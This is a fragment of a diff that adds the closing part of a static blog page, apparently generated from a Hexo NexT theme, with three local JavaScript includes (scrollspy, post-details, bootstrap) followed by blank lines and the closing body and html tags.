+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
